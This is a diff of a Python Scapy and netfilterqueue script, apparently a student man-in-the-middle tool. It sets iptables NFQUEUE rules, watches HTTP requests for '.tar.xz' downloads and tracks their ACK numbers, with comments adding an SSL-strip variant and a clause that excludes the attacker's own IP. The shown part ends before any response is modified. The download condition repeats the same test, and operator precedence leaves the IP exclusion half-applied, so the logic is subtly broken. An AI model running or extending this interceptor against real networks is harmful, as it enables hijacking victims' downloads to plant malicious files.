@@ -11,12 +11,14 @@ def get_arguments():
 
 
 def create_queue():
-    # targeting
+    # remote target
     # subprocess.call('iptables -I FORWARD -j NFQUEUE --queue-num 1', shell=True)
     # local
+    # subprocess.call('iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
+    # subprocess.call('iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
+    # ssl strip
     subprocess.call('iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
     subprocess.call('iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
-
 
 def remove_queue():
     subprocess.call('iptables --flush', shell=True)
@@ -36,11 +38,14 @@ ack_list = []
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
+        # if scapy_packet[scapy.TCP].dport == 10000:  # ssl strip
         if scapy_packet[scapy.TCP].dport == 80:  # Leaving
             print('Req')
-            if '.tar.xz' in scapy_packet[scapy.Raw].load or '.tar.xz' in scapy_packet[scapy.Raw].load:  # Download exe file.
+            if '.tar.xz' in scapy_packet[scapy.Raw].load or '.tar.xz' in scapy_packet[scapy.Raw].load\
+                    and '10.0.2.15' not in scapy_packet[scapy.Raw].load:  # Download exe file.
                 ack_list.append(scapy_packet[scapy.TCP].ack)
                 print('[+] exe Request')
+        # elif scapy_packet[scapy.TCP].sport == 10000:  # ssl strip
         elif scapy_packet[scapy.TCP].sport == 80:  # Response
             print('Res')
             if scapy_packet[scapy.TCP].seq in ack_list:
